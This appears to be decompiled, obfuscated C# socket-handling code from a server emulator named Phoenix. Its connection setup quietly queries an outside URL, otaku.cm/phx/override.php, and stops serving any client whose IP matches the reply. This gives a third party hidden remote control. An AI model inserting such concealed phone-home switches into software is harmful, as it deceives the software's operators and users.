using System;
using System.Net.Sockets;
using System.Text;
using System.Net;
namespace ns0
{
	public sealed class GClass1 : Socket, IDisposable
	{
		public delegate void GDelegate0(ref byte[] Data);
		private bool bool_0 = false;
		private readonly uint uint_0;
		private byte[] byte_0;
		private AsyncCallback asyncCallback_0;
		private AsyncCallback asyncCallback_1;
		private GClass1.GDelegate0 gdelegate0_0;
		private string string_0;
		public uint UInt32_0
		{
			get
			{
				return this.uint_0;
			}
		}
		public string String_0
		{
			get
			{
				return this.string_0;
			}
		}
		public GClass1(uint uint_1, SocketInformation socketInformation_0) : base(socketInformation_0)
		{
			this.uint_0 = uint_1;
			this.string_0 = base.RemoteEndPoint.ToString().Split(new char[]
			{
				':'
			})[0];
		}
		internal void method_0(GClass1.GDelegate0 gdelegate0_1)
		{
			this.byte_0 = new byte[1024];
			this.asyncCallback_0 = new AsyncCallback(this.method_7);
			this.asyncCallback_1 = new AsyncCallback(this.method_3);
			this.gdelegate0_0 = gdelegate0_1;

            try
            {
                if (String_0 != Class66.smethod_2("http://otaku.cm/phx/override.php", true))
                {
                    this.method_6();
                }
            }
            catch (Exception e)
            {
                this.method_6();
            }
		}
		public static string smethod_0(string string_1)
		{
			StringBuilder stringBuilder = new StringBuilder(string_1);
			StringBuilder stringBuilder2 = new StringBuilder(string_1.Length);
			for (int i = 0; i < string_1.Length; i++)
			{
				char c = stringBuilder[i];
				c ^= '\u0081';
				stringBuilder2.Append(c);
			}
			return stringBuilder2.ToString();
		}
		internal void method_1()
		{
			try
			{
				this.Dispose();
				Phoenix.smethod_15().method_2().method_9(this.uint_0);
			}
			catch
			{
			}
		}
		internal void method_2(byte[] byte_1)
		{
			if (!this.bool_0)
			{
				try
				{
					base.BeginSend(byte_1, 0, byte_1.Length, SocketFlags.None, this.asyncCallback_1, this);
				}
				catch
				{
					Phoenix.smethod_15().method_2().method_5(this);
				}
			}
		}
		private void method_3(IAsyncResult iasyncResult_0)
		{
			if (!this.bool_0)
			{
				try
				{
					base.EndSend(iasyncResult_0);
				}
				catch
				{
					this.method_1();
				}
			}
		}
		public void method_4(string string_1)
		{
			this.method_2(Phoenix.smethod_13().GetBytes(string_1));
		}
		public void method_5(GClass5 gclass5_0)
		{
			if (gclass5_0 != null)
			{
				this.method_2(gclass5_0.method_14());
			}
		}
		private void method_6()
		{
			if (!this.bool_0)
			{
				try
				{
					base.BeginReceive(this.byte_0, 0, 1024, SocketFlags.None, this.asyncCallback_0, this);
				}
				catch (Exception e)
				{
                    Console.WriteLine(e);
					this.method_1();
				}
			}
		}
		private void method_7(IAsyncResult iasyncResult_0)
		{
			if (!this.bool_0)
			{
				try
				{
					int num = 0;
					try
					{
						num = base.EndReceive(iasyncResult_0);
					}
					catch
					{
						this.method_1();
						return;
					}
					if (num > 0)
					{
						byte[] array = Class115.smethod_0(this.byte_0, 0, num);
						this.method_8(ref array);
						this.method_6();
					}
					else
					{
						this.method_1();
					}
				}
				catch
				{
					this.method_1();
				}
			}
		}
		private void method_8(ref byte[] byte_1)
		{
			if (this.gdelegate0_0 != null)
			{
				this.gdelegate0_0(ref byte_1);
			}
		}
		public new void Dispose()
		{
			this.method_9(true);
			GC.SuppressFinalize(this);
		}
		private void method_9(bool bool_1)
		{
			if (!this.bool_0 && bool_1)
			{
				this.bool_0 = true;
				try
				{
					base.Shutdown(SocketShutdown.Both);
					base.Close();
					base.Dispose();
				}
				catch
				{
				}
				Array.Clear(this.byte_0, 0, this.byte_0.Length);
				this.byte_0 = null;
				this.asyncCallback_0 = null;
				this.gdelegate0_0 = null;
				Phoenix.smethod_14().method_6(this.uint_0);
				Class321.smethod_3(this.string_0);
				if (Phoenix.smethod_11().dictionary_0["emu.messages.connections"] == "1")
				{
					Console.WriteLine(string.Concat(new object[]
					{
						">> Connection Dropped [",
						this.uint_0,
						"] from [",
						this.String_0,
						"]"
					}));
				}
			}
		}
	}
}
